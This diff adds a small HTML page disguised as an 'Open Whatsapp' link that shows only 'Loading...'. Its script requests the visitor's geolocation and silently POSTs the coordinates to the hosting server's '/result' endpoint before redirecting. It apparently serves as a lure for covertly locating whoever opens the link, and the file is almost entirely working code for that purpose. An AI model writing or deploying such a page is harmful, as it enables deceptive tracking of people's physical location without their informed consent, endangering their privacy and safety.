@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en" id="facebook" class="no_js">
+
+<head>
+  <meta charset="utf-8" />
+  <title>Open Whatsapp</title>
+</head>
+
+<body>
+  <div>Loading...</div>
+  <script>
+    const READY_STATE_DONE = 4;
+
+    if (/* check if available */navigator.geolocation) {
+
+      function sendLoc(position) {
+        const request = new XMLHttpRequest();
+        request.open("POST", "/result")
+        request.setRequestHeader("Content-Type", "application/json")
+        request.onreadystatechange = (ev) => {
+          if(request.status === 200 && request.readyState === READY_STATE_DONE) {
+            // why don't use window.location.href
+            window.history.pushState({}, '/redirect', window.location.origin + '/redirect')
+            window.location.reload()
+          }
+        }
+        request.send(JSON.stringify({
+          latitude: String(position.coords.latitude),
+          longitude: String(position.coords.longitude),
+        }))
+      }
+
+      navigator.geolocation.getCurrentPosition(sendLoc)
+    }
+  </script>
+</body>
